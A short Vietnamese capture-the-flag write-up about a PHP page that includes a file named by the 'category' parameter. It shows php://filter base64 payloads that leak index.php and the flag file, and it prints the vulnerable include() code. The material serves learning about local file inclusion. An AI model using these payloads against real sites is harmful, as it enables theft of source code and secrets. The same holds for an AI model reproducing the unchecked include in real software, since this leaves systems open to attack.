Mở đầu challenge, cho ta trang web có 2 link `woofers` và `meowers`.Mình thử nhấp vào 1 trong 2.Nhận thấy URL thay đổi `/index.php?category=woofers`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/760e8341-4d7e-44d6-9317-b5ea50c6556d)

Mình nghĩ bài này là RCE.Mình thử đọc file index bằng payload sau.

`php://filter/convert.base64-encode/resource=index`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4d638aa3-1a15-46d0-a7d0-e7365fb24352)

Kết quả trả về là 1 dãy base64.Sau khi decode.

```php
 <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```

Vậy thì input `Category` bắt buộc phải có `woofers`, `meowers` hoặc `index`.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/d21adce0-8f88-42e2-b70c-8ad2a00fe5b1)

Nhận thấy load thành công file flag.

`php://filter/convert.base64-encode/woofers/resource=flag`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/656aaf2f-0d12-4307-bf6e-2f4021260184)

Sau đó chỉ cần decode là xong.
